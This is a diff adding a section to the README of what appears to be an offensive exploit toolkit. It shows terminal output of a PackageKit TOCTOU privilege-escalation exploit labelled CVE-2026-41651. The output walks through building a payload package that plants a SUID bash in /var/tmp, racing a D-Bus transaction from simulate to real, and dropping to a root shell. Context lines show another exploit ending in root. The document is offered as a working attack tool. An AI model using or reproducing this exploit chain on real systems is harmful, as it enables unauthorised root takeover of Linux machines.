@@ -286,3 +286,36 @@ user@debian:~/fullEx$ ./fullEx.sh -CFail
 uid=0(root) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
 #
 ```
+## 💀 Pack2TheRoot
+
+```
+user@debian:~/fullEx$ ./fullEx.sh -PKroot
+============================================================
+  CVE-2026-41651 — Pack2TheRoot => PackageKit TOCTOU Privilege Escalation
+  github : https://github.com/0xBlackash/CVE-2026-41651/
+  Author : Ashraf Zaryouh / @0xBlackash
+============================================================
+
+[+] SUID drop directory: /var/tmp  (no nosuid/noexec)
+[+] Package format: DEB
+[*] Building test packages...
+[+] Dummy pkg:   /tmp/pk-dummy-2219.deb
+[+] Payload pkg: /tmp/pk-payload-2219.deb
+[+] Payload installs SUID bash to: /var/tmp/.suid_bash
+
+[*] Connecting to system D-Bus...
+[*] Creating PackageKit transaction...
+[+] Transaction ID: /5_cdeecccc
+
+[*] Firing TOCTOU race (SIMULATE → REAL on same transaction)...
+[*] Polling for SUID at /var/tmp/.suid_bash (90s max)...
+..
+[+] Confirmed: /var/tmp/.suid_bash is SUID root (mode=0o104755)
+
+[+] Dropping to root shell via SUID bash (-p preserves effective UID=0)
+[+] --- ROOT SHELL FOLLOWS ---
+
+.suid_bash-5.2# bash -p
+bash-5.2# id
+uid=1000(user) gid=1000(user) euid=0(root) groupes=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
+```
